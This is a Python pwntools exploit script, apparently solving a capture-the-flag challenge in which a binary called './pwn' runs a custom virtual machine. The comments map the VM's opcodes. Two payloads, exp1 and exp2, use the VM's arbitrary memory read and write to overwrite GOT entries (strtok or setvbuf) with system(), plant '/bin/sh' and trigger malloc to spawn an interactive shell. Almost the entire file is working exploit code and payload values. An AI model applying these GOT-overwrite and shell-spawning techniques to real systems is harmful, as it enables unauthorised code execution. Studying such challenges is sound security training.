from pwn import *
context(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

io = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

'''
[type: int]--[reg[14] = mem]--[n1 n2]
0 	: reg[n1] = reg[n2]
1 	: reg[n1] < = > reg[n2] ==> eflag = 2 0 1
2 	: reg[n1] += reg[n2]
3 	: reg[n1] -= reg[n2]
4 	: reg[n2] <=/> 0 ==> rip -/+ reg[1]
5/8/9   : reg[n1] &= reg[n2]
6 	: reg[n1] = mem[n2]
7 	: mem[n2] = reg[n1]
10	: reg[n1] = n2
......
'''

def exp1():
	"""
	payload: malloc->0x4014A0->strtok(buf, " ")->system(buf, " ")->read '/bin/sh\x00' to get shell
	only overwrite the low 4 bytes of strtok to system, but overwrite the malloc 2 times because of high 4 bytes is zero
	10: 14 strtok.plt_l ==> reg[14] = mem -> strtok.plt_l
	6 : 0  0            ==> reg[0] = mem[0] -> strtok_addr_l
	10: 1  offset       ==> reg[1] = offset
	2 : 0  1            ==> reg[0] += reg[1] ==> reg[0] = system_addr_l
	7 : 0  0            ==> mem[0] = reg[0] = system_addr_l ==> strtok.plt -> system
	10: 14 malloc.plt_l ==> reg[14] = mem -> malloc.plt_l
	10: 0  0x4014A0     ==> reg[0] = 0x4014A0
	7 : 0  0            ==> mem[0] = reg[0] = 0x4014A0 ==> malloc.plt_l -> 0x4014A0
	10: 14 malloc.plt_h ==> reg[14] = mem -> malloc.plt_h
	10: 0  0            ==> reg[0] = 0
	7 : 0  0            ==> mem[0] = reg[0] = 0 ==> malloc.plt_h = 0
	10: 14 0            ==> reg[14] = mem = 0 -> NULL
	7 : 0  0            ==> malloc
	"""
	print("strtol: ", hex(libc.sym.strtok))
	print("system: ", hex(libc.sym.system))
	offset = libc.sym.system - libc.sym.strtok
	print("offset: ", hex(offset))
	pay = [10, 6, 10, 2, 7, 10, 10, 7, 10, 10, 7, 10, 7, 16]
	io.sendlineafter(b'command:\n', ' '.join([str(i) for i in pay]).encode())
	pay = [14, 0x404098, 0, 0, 1, offset, 0, 1, 0, 0, 14, 0x404070, 0, 0x4014A0, 0, 0, 14, 0x404074, 0, 0, 0, 0, 14, 0, 0, 0, 0xdeadbeef] 
	#debug()
	io.sendlineafter(b'cost:\n', '\n'.join([str(i) for i in pay]).encode())
	io.sendlineafter(b'command:\n', b'/bin/sh\x00')

def exp2():
	"""
	payload: malloc->0x401270->setvbuf(stdin, 0, 2, 0)->system(stdin, 0, 2, 0)->make stdin->'/bin/sh\x00' or 'sh\x00'
	# [setvbuf.plt -> system_addr]
	10: 14 setvbuf.plt_l ==> reg[14] = mem -> setvbuf.plt_l
	6 : 0  0             ==> reg[0] = mem[0] -> setvbuf_addr_l
	10: 1  offset        ==> reg[1] = offset
	2 : 0  1             ==> reg[0] += reg[1] ==> reg[0] = system_addr_l
	7 : 0  0             ==> mem[0] = reg[0] = system_addr_l
	# [stdin -> sh_addr]
	10: 14 stdin_l       ==> reg[14] = mem -> stdin_l
	10: 0  sh_addr_l     ==> reg[0] = sh_addr_l	
	7 : 0  0             ==> mem[0] = reg[0] -> sh_addr_l
	10: 14 stdin_h       ==> reg[14] = mem -> stdin_h
	10: 0  sh_addr_h     ==> reg[0] = sh_addr_h
	7 : 0  0             ==> mem[0] = reg[0] -> sh_addr_h
	# [write '/bin/sh' to sh_addr]	
	10: 14 sh_addr_l     ==> reg[14] = mem -> sh_addr_l
	10: 0  0x6e69622f
	7 : 0  0             ==> mem[0] = reg[0] -> "/bin"
	10: 14 sh_addr_h
	10: 0  0x68732f
	7 : 0  0             ==> sh_addr -> "/bin/sh\x00"
	# [malloc -> 0x401270]
	10: 14 malloc.plt_l
	10: 0  0x401270
	7 : 0  0
	10: 14 malloc.plt_h
	10: 0  0
	7 : 0  0
	# [exec malloc]
	10: 14 0
	7 : 0  0	
	"""
	bss = elf.bss() + 0x100
	offset = libc.sym.system - libc.sym.setvbuf
	pay = [10, 6, 10, 2, 7, 10, 10, 7, 10, 10, 7, 10, 10, 7, 10, 10, 7, 10, 10, 7, 10, 10, 7, 10, 7, 16]
	io.sendlineafter(b'command:\n', ' '.join([str(i) for i in pay]).encode())
	pay = [14,0x404020,0,0,1,offset,0,1,0,0,14,0x4040D0,0,bss,0,0,14,0x4040D4,0,0,0,0,14,bss,0,0x6e69622f,
	       0,0,14,bss+4,0,0x68732f,0,0,14,0x404070,0,0x401270,0,0,14,0x404074,0,0,0,0,14,0,0,0,0xdeadbeef]
	#debug()
	io.sendlineafter(b'cost:\n', '\n'.join([str(i) for i in pay]).encode())

if __name__ == '__main__':
	#exp1()
	exp2()
	io.interactive()


